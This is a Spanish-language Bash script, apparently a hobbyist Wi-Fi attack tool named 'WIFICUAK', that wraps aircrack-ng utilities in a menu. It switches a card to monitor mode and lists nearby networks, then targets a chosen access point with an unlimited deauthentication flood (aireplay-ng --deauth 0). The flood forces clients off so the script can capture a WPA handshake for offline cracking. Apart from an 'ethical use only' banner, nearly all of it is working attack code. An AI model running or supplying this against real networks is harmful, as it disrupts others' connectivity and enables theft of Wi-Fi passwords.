#!/bin/bash/

#X+X+X+X+X+X+X+X+X+X+X+X+X+
#Puntero hacia la interfaz
#X+X+X+X+X+X+X+X+X+X+X+X+X+
function selectInterface(){

tarjetas=$(ifconfig -a | cut -d " " -f 1 | sed 's/lo://g; s/:/\n\n/g; $d; $d; s/\(\b[a-z]\)/ \[\] \1/g' | sed ':a;N;$!ba;s/\n//g; s/\[\([^]]*\)\]/\n\1/g' | awk 'BEGIN{i=1} {if($1 !~ /^$/) {printf (" \033[1;31m[\033[0m\033[1;37m%d\033[0m\033[1;31m]\033[0m%s \n",i,$0); i++} else { print $0} } ')

printf "\n\n \033[1;31m[\033[0m\033[1;37m0\033[0m\033[1;31m]\033[0m volver"
printf "$tarjetas"
printf "\n\n  Seleccione una tarjeta: "

read tarjeta_mon

tarjetaStart=$(printf "$tarjetas" | cut -d "]" -f 2 | sed 's/ //g' | awk "NR==$tarjeta_mon+1" 2> /dev/null |  sed "s/ //g; s/^....//")
sacarNumero=$(printf "$tarjetas"  | cut -d "[" -f 5 | cut -d "]" -f 1 | sed s'/.$//' | cut -d "m" -f 2 | grep $tarjeta_mon 2>/dev/null)
sacarmondelfinal=$(printf "$tarjetaStart" | cut -d "m" -f 1 | sed 's/\(\b[a-z]\)/\1/g')
sacarModelo=$(iwconfig $tarjetaStart 2>/dev/null | sed ':a;N;$!ba;s/\n//g' | sed -n '/Mode:/s/.*Mode://; s/ .*//p')

if [ "$(echo $sacarNumero)" == "" ] > /dev/null 2>&1;then
   sacarModelo=$(iwconfig null 2>/dev/null | sed ':a;N;$!ba;s/\n//g' | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
fi

}

#X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X
#Poner la tarjeta en modo monitor
#X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X
function monitor(){

while :
do

clear
printf "************ Poner la tarjeta en modo monitor ************"
printf "\n\n Interfaz: \e[1;31m$tarjetaSeleccionada\e[0m | Modo: \e[1;31m$modoSeleccionado\e[0m | Frecuencia: \e[1;31m${frecuenciaOpera2}\e[0m"

selectInterface

if [ $tarjeta_mon == "0" ] > /dev/null 2>&1;then
   break
else
   if [ "$(echo $tarjeta_mon)" == "" ] > /dev/null 2>&1;then
      printf "\n  Seleccione la tarjeta correcta porfavor."
      printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
      read -p ""
   else
      if [ "$(echo ${sacarModelo})" == "$(echo Managed)" ] > /dev/null 2>&1;then
         if [ "$(echo $tarjeta_mon)" == "$(echo $sacarNumero)" ] > /dev/null 2>&1;then
            printf "\n  Cambiando ${tarjetaStart} a modo monitor..."
            airmon-ng check kill &>/dev/null
            airmon-ng start ${tarjetaStart} &>/dev/null
            tarjetas=$(ifconfig -a | cut -d " " -f 1 | sed 's/lo://g; s/:/\n\n/g; $d; $d; s/\(\b[a-z]\)/ \[\] \1/g' | sed ':a;N;$!ba;s/\n//g; s/\[\([^]]*\)\]/\n\1/g' | awk 'BEGIN{i=1} {if($1 !~ /^$/) {printf (" \033[1;31m[\033[0m\033[1;37m%d\033[0m\033[1;31m]\033[0m%s \n",i,$0); i++} else { print $0} } ')
            tarjetaStart=$(printf "$tarjetas" | cut -d "]" -f 2 | sed 's/ //g' | awk "NR==$tarjeta_mon+1" 2> /dev/null |  sed "s/ //g; s/^....//")
            if [ $auxtarjetamon == $sacarNumero ];then
               tarjetaSeleccionada=$(printf "$tarjetaStart")
               modoSeleccionado=$(iwconfig ${tarjetaStart} | sed ':a;N;$!ba;s/\n//g' | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
            fi
            clear
            break
         else
            printf "\n  Seleccione la tarjeta correcta porfavor."
	        printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
            read -p ""
         fi
      else
         if [ "$(echo ${sacarModelo})" == "$(echo Monitor)" ] > /dev/null 2>&1;then
            printf "\n  Ya tienes la interfaz ${tarjetaStart} en modo monitor."
	         printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
            read -p ""
         else
            printf "\n  Seleccione la tarjeta correcta porfavor."
            printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
            read -p ""
         fi
      fi
   fi
fi
done
}
#X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X
#Poner la tarjeta en modo manager
#X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X
function manager(){

while :
do

clear
printf "************ Poner la tarjeta en modo manager ************"
printf "\n\n Interfaz: \e[1;31m$tarjetaSeleccionada\e[0m | Modo: \e[1;31m$modoSeleccionado\e[0m | Frecuencia: \e[1;31m${frecuenciaOpera2}\e[0m"

selectInterface

if [ $tarjeta_mon == "0" ] > /dev/null 2>&1;then
   break
else
   if [ "$(echo $tarjeta_mon)" == "" ] > /dev/null 2>&1;then
      printf "\n  Seleccione la tarjeta correcta porfavor."
      printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
      read -p ""
   else
   if [ "$(echo ${sacarModelo})" == "$(echo Monitor)" ] ;then
      if [ "$(echo $tarjeta_mon)" == "$(echo $sacarNumero)" ] > /dev/null 2>&1;then
         printf "\n  Cambiando ${tarjetaStart} a modo manager..."
         airmon-ng stop ${tarjetaStart} &>/dev/null
         tarjetas=$(ifconfig -a | cut -d " " -f 1 | sed 's/lo://g; s/:/\n\n/g; $d; $d; s/\(\b[a-z]\)/ \[\] \1/g' | sed ':a;N;$!ba;s/\n//g; s/\[\([^]]*\)\]/\n\1/g' | awk 'BEGIN{i=1} {if($1 !~ /^$/) {printf (" \033[1;31m[\033[0m\033[1;37m%d\033[0m\033[1;31m]\033[0m%s \n",i,$0); i++} else { print $0} } ')
         tarjetaStart=$(printf "$tarjetas" | cut -d "]" -f 2 | sed 's/ //g' | awk "NR==$tarjeta_mon+1" 2> /dev/null |  sed "s/ //g; s/^....//")
         if [ $auxtarjetamon == $sacarNumero ];then
            tarjetaSeleccionada=$(printf "$tarjetaStart")
            modoSeleccionado=$(iwconfig ${tarjetaStart} | sed ':a;N;$!ba;s/\n//g' | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
         fi
	 clear
         break
      fi
   else
      if [ $(echo "$tarjetaStart") == $(echo "") ] > /dev/null 2>&1;then
         printf "\n  Seleccione la tarjeta correcta porfavor."
         printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
         read -p ""
      else
         if [ $(echo "$tarjetaStart") == $(echo "${sacarmondelfinal}") ] ;then
            printf "\n  Ya tienes la interfaz ${tarjetaStart} en modo manager."
            printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
            read -p ""
         fi
      fi
   fi
   fi
fi

done
}

#X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+
#Seleccionar tarjeta de red en el menu
#X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+X+
function interfazPrincipal(){

while :
do

clear
printf "************ Selecciona una interfaz ************"
printf "\n\n Interfaz: \e[1;31m$tarjetaSeleccionada\e[0m | Modo: \e[1;31m$modoSeleccionado\e[0m | Frecuencia: \e[1;31m${frecuenciaOpera2}\e[0m"

selectInterface

if [ $tarjeta_mon == "0" ] > /dev/null 2>&1;then
   break
else
   if [ "$(echo $tarjeta_mon)" == "" ] > /dev/null 2>&1;then
      printf "\n  Seleccione la tarjeta correcta porfavor."
      printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
      read -p ""
   else
      if [ "$(echo $tarjetaStart)" == "$(echo ${sacarmondelfinal})" ] || [ "$(echo $tarjetaStart)" == "$(echo ${sacarmondelfinal}mon)" ] > /dev/null 2>&1;then
         if [ "$(echo $tarjeta_mon)" == "$(echo $sacarNumero)" ] > /dev/null 2>&1;then
            printf "\n  Interfaz seleccionada ${tarjetaStart}."
            tarjetaSeleccionada=$(printf "$tarjetaStart")
            modoSeleccionado=$(iwconfig $tarjetaStart | sed ':a;N;$!ba;s/\n//g' | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
            frecuenciaOpera2=$(iwlist $tarjetaStart frequency | sed -n '1d; 3p' | sed ':a;N;$!ba;s/\n//g' | cut -d ":" -f 2 | cut -b 2 | sed "s/ //g")
            frecuenciaOpera5=$(iwlist $tarjetaStart frequency | sed -n '1d; 15p' | sed ':a;N;$!ba;s/\n//g' | cut -d ":" -f 2 | cut -b 2 | sed "s/ //g")
            auxtarjetamon=$(printf "$tarjeta_mon")
            if [ $frecuenciaOpera2 == "2" ] && [ $frecuenciaOpera5 == "5" ];then
               frecuenciaOpera2=$(printf "$frecuenciaOpera2" | sed  's/\(2\)/\1.4GHz, /' && printf "$frecuenciaOpera5" | sed  's/\(5\)/\1GHz /') 
            else
               if [ $frecuenciaOpera2 == "5" ];then
                  frecuenciaOpera2=$(printf "$frecuenciaOpera2" | sed 's/\(5\)/\1GHz /')
               else
                  if [ $frecuenciaOpera2 == "2" ];then
                     frecuenciaOpera2=$(printf "$frecuenciaOpera2" | sed 's/\(2\)/\1GHz /')
                  fi
               fi
            fi
            clear
            break
         else
            printf "\n  Seleccione la tarjeta correcta porfavor."
            printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
            read -p ""
         fi
      else
         printf "\n  Ya tienes la interfaz ${tarjetaStart} en modo monitor."
         printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
         read -p ""
      fi
   fi
fi

done
}
#X+X+X+X+X+X+X+X+
#Sacar handshake
#X+X+X+X+X+X+X+X+
function ejecucion_airodump-ng(){

if [ "$(echo $tarjeta_mon)" == "" ];then
   printf "\n  Seleccione primero la tarjeta porfavor."
   printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
   read -p ""
else
   if [ "$(echo ${modoSeleccionado})" == "$(echo Monitor)" ] ;then
   xterm -e "airodump-ng -w /tmp/outputArNg --output-format csv ${tarjetaSeleccionada}"
   else
      printf "\n  La tarjeta no esta en modo monitor."
      printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
      read -p ""
   fi
fi
}
#X+X+X+X+X+X+X+X+X+X+X+
#Launcher airodump-ng
#X+X+X+X+X+X+X+X+X+X+X+
function Launcher_airodump-ng(){
clear

ejecucion_airodump-ng

if [ "$(echo $tarjeta_mon)" == "" ];then
   printf ""
else
   if [ "$(echo ${modoSeleccionado})" == "$(echo Monitor)" ] ;then

   printf "************ Sleccione la red ************\n\n\n"

   while IFS= read -r line; do
      macrepetidas=$(grep $line /tmp/outputArNg-01.csv | wc -l)
     
      if [[ "$macrepetidas" > 1 ]]; then
         sed -i "s/${line}/+${line}/" /tmp/outputArNg-01.csv
      fi
   done < <(cat /tmp/outputArNg-01.csv | sed '1,2d' | cut -d "," -f 1 | sed '/Station/,1d')

   rojo=$(printf "\e[1;31m")
   extrojo=$(printf "\e[0m")

   launch_irodump=$(cat /tmp/outputArNg-01.csv | sed '1,2d' | cut -d "," -f 1,6,4,9,14 | sed 's/,/   /g; /Station/,$d' | sed '$d' | nl -w3 -s "]    " | sed 's/[0-9]/[&/' | sed "s/\[/${rojo}\[${extrojo}/g; s/\]/${rojo}\]${extrojo}/g " | sed 's/WPA2 WPA/WPA2/;s/         -/        -/;s/        -/            -/;s/[0-9][0-9][0-9]    /&-/;s/    -W/   W/g;s/    -        -/           -/g;s/WEP    /WEP     /;s/WEP      /WEP     /; s/WPA    /WPA     /;s/WPA      /WPA     / ; s/OPN    /OPN     /; s/OPN      /OPN     /; s/    $/    (Hidden Wifi)/; s/ -1    (/ -1     (/;s/    ++/ *  /; s/    +/ *  /')
   printf "  Num          Bssid         CHN    Cifr    PWR       Essid\n******************************************************************\n$launch_irodump"
   printf "\n\n  \"*\" clientes conectados"
   printf "\n\n  Seleciona una red: "

   read num_mac_launch

   mac_seleccionada=$(cat /tmp/outputArNg-01.csv | sed '1,2d' | cut -d "," -f 1 | sed 's/,/   /g; /Station/,$d' | cut -d "]" -f 2 | sed 's/ //g' | awk "NR==$num_mac_launch" 2> /dev/null | sed 's/+//g')
   canal_selecionado=$(cat /tmp/outputArNg-01.csv | sed '1,2d' | cut -d "," -f 4 | sed 's/,/   /g; /Station/,$d' | cut -d "]" -f 2 | sed 's/ //g' | awk "NR==$num_mac_launch" 2> /dev/null | sed 's/+//g')

   while :
   do

   salir="false"

   xterm -geometry 93x25+9000+30 -hold -e "airodump-ng -w /tmp/capture --output-format pcap --bssid $mac_seleccionada -c $canal_selecionado $tarjetaSeleccionada" & airodump_filter_xterm_PID=$!

   sleep 2;

   xterm -geometry 93x25+9000+390 -fg red -hold -e "aireplay-ng --deauth 0 -a $mac_seleccionada --ignore-negative-one $tarjetaSeleccionada" & aireplay_xterm_PID=$!

   sleep 0; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
   sleep 0; kill -9 $airodump_filter_xterm_PID; wait $airodump_filter_xterm_PID 2>/dev/null

   rm /tmp/outputArNg-01.csv 2>/dev/null

   while :
   do

   verificar_handshake=$(aircrack-ng /tmp/capture-01.cap 2>/dev/null | grep -E "\([1-9][0-9]? handshake" | cut -d "(" -f 2 | sed 's/ handshake)//g')

   if [[ "$verificar_handshake" < 1 ]];then
      clear
      printf "\n  No se creo el handshake."
      printf " \n\n  Deseas volver a intentarlo? \e[1;31m[Y/N]\e[0m: "
      read decision_handshake

      if [ "$decision_handshake" == "Y" ] || [ "$decision_handshake" == "y" ];then
         read "" 2>/dev/null
         rm /tmp/capture-01.cap
         break
      else
         if [ "$decision_handshake" == "N" ] || [ "$decision_handshake" == "n" ];then
            salir="break"
            rm /tmp/capture-01.cap
            break
         else
            clear
            printf "\n  No seleccionaste la opcion correcta."
            printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
            read -p "" 
            continue
         fi
      fi
   fi

   done

   $salir

   done
   fi
fi
}

while :
do

clear
printf "\n\e[1;31m ██     ██ ██ ███████ ██  ██████ ██    ██  █████  ██   ██\e[0m\n"
printf "\e[1;31m ██     ██ ██ ██      ██ ██      ██    ██ ██   ██ ██  ██ \e[0m\n"
printf "\e[1;31m ██  █  ██ ██ █████   ██ ██      ██    ██ ███████ █████  \e[0m\n"
printf "\e[1;31m ██ ███ ██ ██ ██      ██ ██      ██    ██ ██   ██ ██  ██ \e[0m\n"
printf "\e[1;31m  ███ ███  ██ ██      ██  ██████  ██████  ██   ██ ██   ██\e[0m\n"

printf "\n Herramienta solo para el uso hetico"
printf "\n By N1P0STK4"

printf "\n\n Interfaz: \e[1;31m$tarjetaSeleccionada\e[0m | Modo: \e[1;31m$modoSeleccionado\e[0m | Frecuencia: \e[1;31m${frecuenciaOpera2}\e[0m"
printf "\n\n \e[1;31m[\e[0m\e[1;37m0\e[0m\e[1;31m]\e[0m Salir del script."
printf "\n \e[1;31m[\e[0m\e[1;37m1\e[0m\e[1;31m]\e[0m Tarjeta modo monitor."
printf "\n \e[1;31m[\e[0m\e[1;37m2\e[0m\e[1;31m]\e[0m Tarjeta modo manager."
printf "\n \e[1;31m[\e[0m\e[1;37m3\e[0m\e[1;31m]\e[0m Seleccionar interfaz."
printf "\n\n \e[1;31m[\e[0m\e[1;37m4\e[0m\e[1;31m]\e[0m Obtener handshake."

printf "\n\n  Opcion a elegir: "
read opcion

case $opcion in
  #Salir del menu.
  0)
    printf "\n  Vuelve pronto ;) \n\n"
    exit 0
  ;;
  1)
    monitor
  ;;
  #Poner la tarjeta en modo manager.
  2)
    manager
  ;;
  3)
    interfazPrincipal
  ;;
  #En caso de que la opcion no se encuentre en el case.
  4)
    Launcher_airodump-ng
  ;;
  *)
    printf "\n  Selecciona la opcion correcta porfavor."
    printf " \n\n  Presione \e[1;31m[Enter]\e[0m para \e[1;31mcontinuar\e[0m."
    read -p ""
  ;;
esac
done
